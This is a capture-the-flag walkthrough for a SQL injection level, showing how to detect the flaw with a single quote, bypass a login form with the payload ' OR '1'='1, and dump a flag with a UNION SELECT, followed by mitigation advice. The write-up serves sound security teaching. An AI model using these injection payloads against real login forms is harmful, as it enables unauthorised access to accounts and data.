# Level 3 Walkthrough: SQL Injection 🕵️‍♂️💻

Welcome to **Level 3** of the Allsafeafrica x SimulationsLabs CTF Challenge! 🚀  
This level introduces you to **SQL Injection (SQLi)**, one of the most common yet dangerous web application vulnerabilities.

---

## 🎯 Challenge Goal

- Access the hidden **flag** stored in the backend database.
- The web app has a login form with fields: `username` and `password`.
- The challenge is to **bypass login** using SQL Injection.

---

## 📝 Step-by-Step Walkthrough

### 1. Understand the Scenario
When you enter a username and password, the backend likely runs an SQL query like:
```sql
SELECT * FROM users WHERE username = '<input>' AND password = '<input>';
```

If input is not properly sanitized, you can **inject SQL code**.

---

### 2. Test for SQLi Vulnerability
Try entering a single quote `'` in the username field:
```txt
Username: '
Password: test
```

If you get an error like:
```sql
You have an error in your SQL syntax
```
Congrats — it’s vulnerable to SQL Injection.

---

### 3. Bypass Login with SQL Injection
A classic trick is using:
```txt
Username: ' OR '1'='1
Password: anything
```

This changes the query to:
```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'anything';
```

Since `'1'='1'` is **always true**, the system logs you in without a valid password. 🎉

---

### 4. Extract the Flag
Once logged in, explore the app. You may find the **flag** displayed on the dashboard or in hidden pages.

If the challenge provides direct query-based hints, you can attempt:
```sql
' UNION SELECT 1, flag, 3 -- 
```
This could dump the flag from a `flag` column in a table.

---

## ✅ Flag Found
Example (for demo):
```txt
FLAG{SQLi_Unlocked_Level3}
```

---

## 🔒 Mitigation (Real-World Lesson)
To prevent SQL Injection:
- Use **Prepared Statements (Parameterized Queries)**.
- Validate and sanitize user inputs.
- Apply the **Principle of Least Privilege** to database accounts.

---

## 🌍 Why It Matters
SQL Injection is one of the **OWASP Top 10** vulnerabilities and has caused massive real-world breaches. By practicing it in a **safe CTF environment**, you:
- Learn attacker mindset.
- Build stronger defenses.
- Unlock new cyber skills for real-world security challenges.

---

🚀 Next step: Try harder queries, explore blind SQLi, and prepare for **Level 4**!
